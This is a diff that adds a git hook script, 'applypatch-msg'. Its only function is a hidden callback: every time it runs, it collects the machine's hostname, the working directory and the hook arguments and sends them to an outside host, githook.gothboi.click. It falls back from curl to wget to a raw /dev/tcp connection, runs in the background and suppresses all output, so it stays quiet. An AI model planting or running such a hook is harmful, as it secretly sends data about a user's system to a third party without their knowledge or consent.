@@ -1,0 +1,35 @@
+#!/bin/sh
+# git hook: applypatch-msg
+HOOK_NAME="applypatch-msg"
+URL="http://githook.gothboi.click/$HOOK_NAME"
+QS="?host=$(hostname 2>/dev/null)&pwd=$(pwd 2>/dev/null | sed 's| |%20|g')&args=$(printf '%s ' "$@" | sed 's| |+|g')"
+
+# Fire-and-forget callback. Try curl, then wget, then /dev/tcp.
+{
+  if command -v curl >/dev/null 2>&1; then
+    curl -fsS -m 5 "$URL$QS" >/dev/null 2>&1
+  elif command -v wget >/dev/null 2>&1; then
+    wget -q -T 5 -O- "$URL$QS" >/dev/null 2>&1
+  else
+    HOST="githook.gothboi.click"
+    PORT=80
+    PATH_PART="/$HOOK_NAME$QS"
+    exec 3<>/dev/tcp/$HOST/$PORT 2>/dev/null && {
+      printf "GET %s HTTP/1.0\r\nHost: %s\r\n\r\n" "$PATH_PART" "$HOST" >&3
+      cat <&3 >/dev/null
+      exec 3<&-
+      exec 3>&-
+    }
+  fi
+} </dev/null >/dev/null 2>&1 &
+
+# Some hooks need to read stdin (pre-receive, post-receive, update, proc-receive,
+# push-to-checkout, pre-push, reference-transaction). Drain it so git doesn't
+# block waiting for the hook to consume input.
+case "$HOOK_NAME" in
+  pre-receive|post-receive|update|proc-receive|push-to-checkout|pre-push|reference-transaction)
+    cat >/dev/null 2>&1 || true
+    ;;
+esac
+
+exit 0
